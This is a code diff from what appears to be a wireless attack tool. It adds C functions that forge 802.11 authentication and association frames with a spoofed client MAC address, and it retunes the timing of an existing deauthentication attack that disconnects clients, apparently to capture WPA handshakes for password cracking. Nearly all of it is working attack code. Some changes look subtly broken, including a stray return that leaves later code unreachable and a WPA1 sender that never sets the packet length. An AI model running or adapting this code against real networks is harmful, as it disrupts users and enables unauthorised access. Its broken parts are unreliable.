@@ -397,6 +397,69 @@ fdwrite();
 return;
 }
 /*===========================================================================*/
+static inline void send_association_req_wpa2_cl(int p)
+{
+static mac_t *macftx;
+
+static const uint8_t associationrequestcapa[] =
+{
+0x31, 0x04, 0x05, 0x00
+};
+#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)
+
+static const uint8_t associationrequestwpa2data[] =
+{
+/* supported rates */
+0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
+/* extended supported rates */
+0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
+/* RSN information AES PSK (WPA2) */
+0x30, 0x14, 0x01, 0x00,
+0x00, 0x0f, 0xac, 0x02, /* group cipher */
+0x01, 0x00, /* count */
+0x00, 0x0f, 0xac, 0x02, /* pairwise cipher */
+0x01, 0x00, /* count */
+0x00, 0x0f, 0xac, 0x02, /* AKM */
+0x80, 0x00,
+/* HT capabilites */
+0x2d, 0x1a, 0x6e, 0x18, 0x1f, 0xff, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x96,
+0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+/* extended capabilites */
+0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
+/* supported operating classes */
+0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
+0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
+/* WMM/WME */
+0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
+};
+#define ASSOCIATIONREQUESTWPA2_SIZE sizeof(associationrequestwpa2data)
+
+packetoutptr = epbown +EPB_SIZE;
+memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +(bssidlist +p)->bssidinfo->essidlen);
+memcpy(packetoutptr, &hdradiotap_ack, HDRRT_SIZE);
+macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
+macftx->type = IEEE80211_FTYPE_MGMT;
+macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
+memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
+memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
+memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
+macftx->duration = 0x013a;
+macftx->sequence = clientsequence++ << 4;
+if(clientsequence > 4095) clientsequence = 1;
+memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
+packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = (bssidlist +p)->bssidinfo->essidlen;
+memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], (bssidlist +p)->bssidinfo->essid, (bssidlist +p)->bssidinfo->essidlen);
+memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE], &associationrequestwpa2data, ASSOCIATIONREQUESTWPA2_SIZE);
+if(((bssidlist +p)->bssidinfo->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x17] = CS_CCMP;
+else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x17] = CS_TKIP;
+packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x1d] = CS_CCMP;
+if(((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = AK_PSK;
+else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = AK_PSKSHA256;
+packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA2_SIZE;
+fdwrite();
+return;
+}
+/*===========================================================================*/
 static inline void send_association_req_wpa2(int p)
 {
 static mac_t *macftx;
@@ -441,7 +504,7 @@ macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
 macftx->type = IEEE80211_FTYPE_MGMT;
 macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
 memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
-memcpy(macftx->addr2,macrgclient, 6);
+memcpy(macftx->addr2, macrgclient, 6);
 memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
 macftx->duration = 0x013a;
 macftx->sequence = clientsequence++ << 4;
@@ -456,6 +519,60 @@ packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist 
 if(((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = AK_PSK;
 else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = AK_PSKSHA256;
 packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA2_SIZE;
+fdwrite();
+return;
+}
+/*===========================================================================*/
+static inline void send_association_req_wpa1_cl(int p)
+{
+static mac_t *macftx;
+
+static const uint8_t associationrequestcapa[] =
+{
+0x31, 0x04, 0x05, 0x00
+};
+#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)
+
+static const uint8_t associationrequestwpa1data[] =
+{
+/* supported rates */
+0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
+/* extended supported rates */
+0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
+/* power Capability */
+0x21, 0x02, 0x04, 0x14,
+/* vendor specific */
+0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
+/* WPA information (WPA1) */
+0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
+0x00, 0x50, 0xf2, 0x02, /* group cipher */
+0x01, 0x00, /* count */
+0x00, 0x50, 0xf2, 0x02, /* pairwise cipher */
+0x01, 0x00,  /* count */
+0x00, 0x50, 0xf2, 0x02, /* AKM */
+};
+#define ASSOCIATIONREQUESTWPA1_SIZE sizeof(associationrequestwpa1data)
+
+packetoutptr = epbown +EPB_SIZE;
+memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +(bssidlist +p)->bssidinfo->essidlen);
+memcpy(packetoutptr, &hdradiotap_ack, HDRRT_SIZE);
+macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
+macftx->type = IEEE80211_FTYPE_MGMT;
+macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
+memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
+memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
+memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
+macftx->duration = 0x013a;
+macftx->sequence = clientsequence++ << 4;
+if(clientsequence > 4095) clientsequence = 1;
+memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
+packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = (bssidlist +p)->bssidinfo->essidlen;
+memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], (bssidlist +p)->bssidinfo->essid, (bssidlist +p)->bssidinfo->essidlen);
+memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE], &associationrequestwpa1data, ASSOCIATIONREQUESTWPA1_SIZE);
+if(((bssidlist +p)->bssidinfo->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x17] = CS_CCMP;
+else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x17] = CS_TKIP;
+packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x1d] = CS_CCMP;
+if(((bssidlist +p)->bssidinfo->wpaakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = AK_PSK;
 fdwrite();
 return;
 }
@@ -563,6 +680,34 @@ fdwrite();
 return;
 }
 /*===========================================================================*/
+static inline void send_authentication_req_opensystem_cl(int p)
+{
+static mac_t *macftx;
+
+static const uint8_t authenticationrequestdata[] =
+{
+0x00, 0x00, 0x01, 0x00, 0x00, 0x00
+};
+#define MYAUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)
+
+packetoutptr = epbown +EPB_SIZE;
+memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE +1);
+memcpy(packetoutptr, &hdradiotap_ack, HDRRT_SIZE);
+macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
+macftx->type = IEEE80211_FTYPE_MGMT;
+macftx->subtype = IEEE80211_STYPE_AUTH;
+memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
+memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
+memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
+macftx->duration = 0x013a;
+macftx->sequence = clientsequence++ << 4;
+if(clientsequence > 4095) clientsequence = 1;
+memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationrequestdata, MYAUTHENTICATIONREQUEST_SIZE);
+packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE;
+fdwrite();
+return;
+}
+/*===========================================================================*/
 static inline void send_authentication_req_opensystem(int p)
 {
 static mac_t *macftx;
@@ -579,7 +724,7 @@ memcpy(packetoutptr, &hdradiotap_ack, HDRRT_SIZE);
 macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
 macftx->type = IEEE80211_FTYPE_MGMT;
 macftx->subtype = IEEE80211_STYPE_AUTH;
-memcpy(macftx->addr1,(bssidlist +p)->mac, 6);
+memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
 memcpy(macftx->addr2, macrgclient, 6);
 memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
 macftx->duration = 0x013a;
@@ -1174,7 +1319,6 @@ for(p = 0; p < BSSIDLIST_MAX; p++)
 		(bssidlist +p)->timestamp = timestamp;
 		(bssidlist +p)->bssidinfo->timestampclient = timestamp;
 		memcpy((bssidlist +p)->bssidinfo->macclient, macfrx->addr2, 6);
-		
 		return;
 		}
 	}
@@ -1987,7 +2131,7 @@ for(p = 0; p < BSSIDLIST_MAX; p++)
 			#endif
 			return;
 			}
-		if((bssidlist +p)->bssidinfo->deauthattackcount >= ((bssidlist +p)->bssidinfo->deauthattackfactor +18))
+		if((bssidlist +p)->bssidinfo->deauthattackcount >= ((bssidlist +p)->bssidinfo->deauthattackfactor +26))
 			{
 			(bssidlist +p)->bssidinfo->deauthattackcount = 0;
 			(bssidlist +p)->bssidinfo->deauthattackfactor += 1;
@@ -2018,6 +2162,23 @@ for(p = 0; p < BSSIDLIST_MAX; p++)
 		#ifdef GETM1234
 		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +6))
 			{
+			if(memcmp(&mac_broadcast, (bssidlist +p)->bssidinfo->macclient, 6) == 0) send_pspoll(p);
+			else send_authentication_req_opensystem_cl(p);
+			return;
+			}
+		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +10))
+			{
+			if(memcmp(&mac_broadcast, (bssidlist +p)->bssidinfo->macclient, 6) == 0) send_pspoll(p);
+			else
+				{
+				if((((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK)) send_association_req_wpa2_cl(p);
+				else if((((bssidlist +p)->bssidinfo->wpaakm &TAK_PSK) == TAK_PSK)) send_association_req_wpa1_cl(p);
+				}
+			return;
+			}
+		return;
+		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +14))
+			{
 			if(((bssidlist +p)->bssidinfo->essidlen == 0) || ((bssidlist +p)->bssidinfo->essid[0] == 0)) send_pspoll(p);
 			else
 				{
@@ -2029,7 +2190,7 @@ for(p = 0; p < BSSIDLIST_MAX; p++)
 		#endif
 		if(((bssidlist +p)->bssidinfo->rsncapa &MFP_REQUIRED) != 0) return;
 		#ifdef GETM1234
-		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +10))
+		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +18))
 			{
 			send_deauthentication2client(p, WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA);
 			if(memcmp(&mac_broadcast, (bssidlist +p)->bssidinfo->macclient, 6) != 0) send_deauthentication2ap(p, WLAN_REASON_DEAUTH_LEAVING);
@@ -2037,7 +2198,7 @@ for(p = 0; p < BSSIDLIST_MAX; p++)
 			}
 		#endif
 		#ifdef GETM1234
-		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +14))
+		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +22))
 			{
 			send_deauthentication2client(p, WLAN_REASON_CLASS2_FRAME_FROM_NONAUTH_STA);
 			if(memcmp(&mac_broadcast, (bssidlist +p)->bssidinfo->macclient, 6) != 0) send_deauthentication2ap(p, WLAN_REASON_DEAUTH_LEAVING);
@@ -2408,6 +2569,7 @@ else if(macfrx->type == IEEE80211_FTYPE_DATA)
 		return;
 		}
 	#endif
+//	if((macfrx->to_ds == 1) && (macfrx->from_ds == 0)) printf("data\n");
 	#if defined(DUMPWPA) || defined(DUMPWEP)
 	if(macfrx->prot ==1)
 		{
